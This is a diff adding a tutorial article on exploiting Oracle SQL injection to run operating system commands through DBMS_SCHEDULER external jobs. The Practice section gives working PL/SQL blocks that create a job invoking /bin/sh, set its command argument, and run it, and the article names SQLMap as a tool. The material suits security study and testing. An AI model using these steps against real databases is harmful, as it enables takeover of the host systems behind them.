@@ -1,0 +1,93 @@
+---
+title: 'Exploiting Oracle DB: OS Command Execution Guide'
+description: Learn to exploit Oracle SQL injection via DBMS_SCHEDULER for OS command
+  execution.
+keywords:
+- Oracle SQL injection
+- DBMS_SCHEDULER
+- OS command execution
+- SQL exploitation
+- Oracle security
+- database vulnerability
+- external jobs
+- command injection
+---
+
+# Package os_command
+
+## Context
+
+This article focuses on exploiting an Oracle SQL injection vulnerability to execute operating system (OS) commands using the DBMS_SCHEDULER package. To successfully follow this guide, you should have a solid understanding of SQL queries, the architecture of Oracle databases, and methods for executing OS commands.
+
+## Theory
+
+### DBMS_SCHEDULER and External Jobs
+
+DBMS_SCHEDULER is a powerful Oracle package that enables the scheduling and execution of jobs directly from the Oracle database. Among its functionalities, it allows for the creation of external jobs, which can execute system-level operating system commands.
+
+The key vulnerability here arises from the ability to manipulate DBMS_SCHEDULER through SQL injection. When implemented improperly, this functionality permits attackers to inject SQL code, which can be used to execute arbitrary OS commands via the schedule jobs feature.
+
+### OS Command Injection via SQL
+
+The process of OS command injection via SQL involves exploiting a vulnerability to manipulate the database to create a job that will execute OS commands. This is feasible due to a weakness in the validation of input which permits SQL injection attacks. By injecting crafted SQL queries, an attacker can direct the database to schedule tasks that execute OS commands, potentially compromising the host system.
+
+### Spooling to File
+
+Spooling in Oracle is the act of writing query results to an external file. This capability can be leveraged during attacks to capture the output of injected commands, thus providing the attacker with results of the OS command execution.
+
+## Practice
+
+### OS Command Execution via DBMS_SCHEDULER
+
+The following steps describe how to execute arbitrary OS commands using the DBMS_SCHEDULER package in an Oracle database.
+
+1. **Create a Job to Execute Shell Commands**
+    
+    The first step involves creating a job within the Oracle database that will facilitate the execution of shell commands. This job is set up via the `DBMS_SCHEDULER.create_job` function.
+
+    ```sql
+    BEGIN 
+        DBMS_SCHEDULER.create_job(
+            job_name => 'cmd_exec', 
+            job_type => 'EXECUTABLE', 
+            job_action => '/bin/sh', 
+            number_of_arguments => 1, 
+            enabled => TRUE
+        ); 
+    END;
+    ```
+
+2. **Set the Command to be Executed by the Job**
+
+    With the job created, the next step is configuring the specific command that the job will execute. This is accomplished using the `DBMS_SCHEDULER.set_job_argument_value` function.
+
+    ```sql
+    BEGIN 
+        DBMS_SCHEDULER.set_job_argument_value(
+            job_name => 'cmd_exec', 
+            argument_position => 1, 
+            argument_value => '-c "<OS_COMMAND>"'
+        ); 
+    END;
+    ```
+
+    Replace `<OS_COMMAND>` with the actual command you intend to run. This might be any shell command, such as a directory listing command like `ls -la`.
+
+3. **Run the Job to Execute the Command**
+
+    Having set the command, running the job is the final step to perform the execution. The `DBMS_SCHEDULER.run_job` function initiates this process.
+
+    ```sql
+    BEGIN 
+        DBMS_SCHEDULER.run_job(job_name => 'cmd_exec'); 
+    END;
+    ```
+
+    Upon execution, the command specified will run on the host operating system where the Oracle database resides, providing access to the results of the OS command execution.
+
+## Tools
+
+- **Oracle SQL*Plus**
+- **SQLMap** 
+
+These tools aid in interfacing with and exploiting the database to achieve the command execution objectives outlined above.
